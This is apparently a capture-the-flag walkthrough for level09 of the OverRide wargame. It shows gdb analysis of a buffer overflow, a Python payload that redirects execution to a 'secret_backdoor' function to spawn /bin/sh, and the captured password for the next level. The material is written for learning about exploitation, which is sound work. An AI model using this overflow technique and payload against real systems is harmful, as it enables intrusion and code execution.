# Level09 Walkthrough

## Analyzing the Program with GDB and ghidra
NEED TO GHIDRA 

1. **Whats happening**: 

- Here is the functions it uses : 
    - 0x000000000000088c  `secret_backdoor` : take the input from stdin and use the `system` function. 
    - 0x00000000000008c0  `handle_msg` : call 2 functions, set_username and set_msg with different size. 
    - 0x00000000000009cd  `set_username` : copy the username with the user input from the beginning
    - 0x0000000000000932  `set_msg` : will copy the message of the stdin and the user input + the size. 

- Its a 64bits arch, we can see `x64` registers.

- We can see different size for the variables :
    - `user_data` : buffer[140] on handle_msg
    ```bash
    (gdb) b handle_msg 
    Breakpoint 1 at 0x8c4
    (gdb) r
    (gdb) info registers rbp
    rbp            0x7fffffffe5c0   0x7fffffffe5c0
    (gdb) print 0x8c
    $4 = 140
    ```
    - `username` : buffer 
    ```bash
    0x0000555555554a29 <+92>:    lea    -0x90(%rbp),%rax <----> utilise an local array[144] for user input
    0x0000555555554a30 <+99>:    mov    $0x80,%esi
    0x0000555555554a35 <+104>:   mov    %rax,%rdi
    0x0000555555554a38 <+107>:   callq  0x555555554770 <fgets@plt> <----> taille maximale de lentree lue par `fgets` est defini par 0x80 [128] so it can SEGFAULT
    [...]
    0x0000555555554a46 <+121>:   mov    -0x4(%rbp),%eax <---> index courant 
    0x0000555555554a49 <+124>:   cltq   
    0x0000555555554a4b <+126>:   movzbl -0x90(%rbp,%rax,1),%ecx
    0x0000555555554a53 <+134>:   mov    -0x98(%rbp),%rdx
    0x0000555555554a5a <+141>:   mov    -0x4(%rbp),%eax
    0x0000555555554a5d <+144>:   cltq   
    0x0000555555554a5f <+146>:   mov    %cl,0x8c(%rdx,%rax,1)

    0x0000555555554a66 <+153>:   addl   $0x1,-0x4(%rbp)
    0x0000555555554a6a <+157>:   cmpl   $0x28,-0x4(%rbp) <----> l'index doit atteindre 40bytes (0x28) ou un caractere '\0'
    ```

- Donc si l'entree contient plus de 40 caractere (jusqu'a la limite de 128 octets), la fonction ecrira en dehors de 40bytes allouees = BUFFER OVERFLOW

- Il y a une taille partage entre les fonctions, l'overflow va s'effectuer dans set_msg

- Buffer overflow test : 
```bash
python -c 'print "A" * 40 + "\xff" + "B" * 255' | ./level09 
and 
gdb ./level09
r <<<$(python -c 'print "A" * 40 + "\xff" + "\n" + "B" * 255')

>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

- it overflow here because it erase the 180bytes pointed by `%rax`, its the maximum size of the msg.
```bash
disas set_msg
0x00005555555549a9 <+119>:   mov    0xb4(%rax),%eax
0x00005555555549af <+125>:   movslq %eax,%rdx
```

+ some informations, on va pouvoir override le registre `rip` with the address of the `secret_backdoor`.

2. **Final walktrough**

- `40` for the index strncpy limit copy
- `\xff` for 255 on hexa 
- `\n` for the user input
- `200` offset find, see above
- `secret_backdoor` address
- `/bin/sh` the command in the stdin

```bash
chmod 777 .
python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > exploit_me
level09@OverRide:~$ cat exploit_me - | ./level09 
[...]
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
^C
Segmentation fault (core dumped)
level09@OverRide:~$ su end 
Password: 
end@OverRide:~$ ls
end
end@OverRide:~$ cat end
GG !
end@OverRide:~$ 
```

---

## Moving to end

1. **Swith User to end**:
    Run ```su end```

```
2. **Authenticate with the Password**:
    
   
 